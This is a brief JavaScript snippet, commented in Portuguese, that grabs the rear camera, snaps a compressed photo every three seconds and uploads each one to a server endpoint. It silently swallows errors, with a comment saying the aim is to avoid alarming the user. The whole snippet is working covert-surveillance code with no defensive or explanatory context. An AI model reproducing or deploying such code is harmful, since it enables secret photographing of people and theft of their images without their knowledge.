// Pega câmera traseira, tira foto a cada 3 s e manda pro servidor
navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false})
.then(stream=>{
  const v=document.getElementById('v');
  v.srcObject=stream;
  v.play();
  setInterval(()=>{
    const c=document.createElement('canvas');
    c.width=v.videoWidth; c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    fetch('save',{method:'POST',body:c.toDataURL('image/jpeg',.6)});
  },3000);
})
.catch(()=>{});   // silencia erro, não assusta usuário
